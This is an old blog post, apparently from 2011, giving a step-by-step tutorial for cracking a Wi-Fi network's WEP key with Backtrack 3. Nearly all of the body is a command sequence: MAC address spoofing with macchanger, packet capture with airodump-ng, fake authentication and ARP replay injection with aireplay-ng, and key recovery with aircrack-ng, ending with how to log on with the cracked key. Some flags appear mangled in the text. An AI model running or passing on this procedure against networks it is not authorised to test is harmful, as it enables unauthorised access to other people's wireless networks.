---
# http://learn.getgrav.org/content/headers
title: Wireless Hacking tutorial using Backtrack
slug: wireless-hacking-tutorial-using-backtrack
# menu: Wireless Hacking tutorial using Backtrack
date: 02-01-2011
published: true
publish_date: 02-01-2011
# unpublish_date: 02-01-2011
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - backtrack
        - hack tool
        - hacking
        - linux
        - software
        - wep
        - wifi
        - wireless
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [backtrack,hack tool,hacking,linux,software,wep,wifi,wireless]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

Wireless Hacking with backtrack 3 is easy to do , in this article I’d like to guide you in Wireless hacking with backtrack 3. This tutorial is made based on some requests by my subscribers , they’ve been familiar enough with Backtrack 3 , that’s why I made this Wireless Hacking with backtrack 3 tutorial. In order to start the wireless hacking , you need to make sure that you have met these requirements :  
 

– Backtrack 3 or newer release

– 1 wireless router

– Laptop with wireless card

And let the hack begins :

In order to crack a WEP key you must have a large number of encrypted packets to work with. This is an unavoidable requirement if you wish to be successful. The best way to get a large number of packets is to perform an ARP request re injection attack (otherwise known as attack -3). In order to do this attack and get results there must be a client already authenticated with the AP, aor connecting to the AP.

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
Here are some things you need to know before you get confused  
When you see this (device) or (bssid) you DON’T put the ( )!!!  
(device) = Your wireless card \*can be seen by typing in iwconfig EG: eth0, eth1, ath0, ath1  
(bssid) = This is the consenting computers bssid \*when you start airodump-ng if there is a AP in range it will show up on the left side will look similar to 00:11:22:33:44:55  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

Now before we start we need to make a txt file in the home folder. On the desktop you will see 2 icons home and system. Double click the home icon, rigt click the blank white area and select create new Txt File name it Exidous or what ever you want! click ok, now close the window.

Ok let’s start!  
Commands | Meaning  
====================

\*open up 3 shell konsoles by clicking the little black box next to the start button.

\* The first thing were going to do is stop the device aka ethernet card  
airmon-ng stop ath0

\* Now were going to put the wireless card down, so we can fake a mac adress (to see available wireless cards type, iwconfig  
ifconfig (device) down

\* Ok now just to make things simpler, so we don’t have to hunt down what our Mac address is  
macchanger –mac 00:11:22:33:44:55 (device)

\* Now were going to start the wireless card \*make it listen for AP’s  
airmon-ng start (device)

\* Lets start seeing what AP’s are there  
airodump-ng (device)

\* After you see all the AP’s execute the following command to stop it and copy the bssid  
CTRL+C Copy bssid of consenting computer

\* Now on to the consenting computer’s AP (were listening in for authentication packets  
airodump-ng -c 6 -w Exidous –bssid (Bssid) (device)

\* Lets get on with making more Data, and start the injection process  
aireplay-ng -l 0 -a (bssid) -h 00:11:22:33:44:55 (device)

\* Now were going to inject the router \*\*\*this sometimes takes a while to actually inject!  
aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (device)

\* On to cracking the key, \*\*\*AFTER GETTING AT LEAST 5,000 Data/IV’s for 64 bit encryption / AFTER GETTING AT LEAST 10,000 Data/IV’s for 128 bit encryption  
aircrack-ng -n 64 –bssid (bssid) Exidous-01.cap

\* Once you crack the wep key you wright it down, and reboot to windows. Now put it in the username and the password with out the :  
EG: Wep Key = 33:C7:C6:09:30  
When Entered into username and password it will look like this. 33C7C60930

Get backtrack linux at – <http://www.backtrack-linux.org/>

Go to our new site- shankee.com
